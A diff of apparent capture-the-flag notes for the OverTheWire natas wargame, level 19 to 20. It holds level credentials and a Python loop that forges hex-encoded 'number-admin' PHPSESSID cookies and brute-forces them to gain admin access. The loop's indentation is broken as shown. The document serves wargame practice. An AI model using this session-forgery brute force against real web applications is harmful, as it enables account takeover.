@@ -321,4 +321,28 @@ or session_id in range(1, 641):
     else:
         print('Still trying', session_id)
 //
-4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</pre><div
+4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+
+lvl 19 --> lvl 20
+http://natas19.natas.labs.overthewire.org/
+natas19
+4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+// From the page : This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+// We had to get the session.cookies['PHPSESSID'], showing some regularity 
+302d61646d696e
+312d61646d696e
+322d61646d696e
+// Playing around with it, we converted to hex to obtain randomNumbers-dusername 
+// so we decided to replace username by admin and to loop through 0 to 640 to replace our randomNumbers
+// Then we had to reconvert it to hex
+for i in range(641):
+    session = requests.Session()
+    session_id = (f'{i}-admin').encode("utf-8").hex()
+    response = session.get(url, cookies = {"PHPSESSID": str(session_id)}, auth = (username, password))
+    content = response.text
+      if( "You are an admin" in content):
+        print('You got it', i)
+        print(content)
+    else:
+        print('Still trying', i)
+// eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>
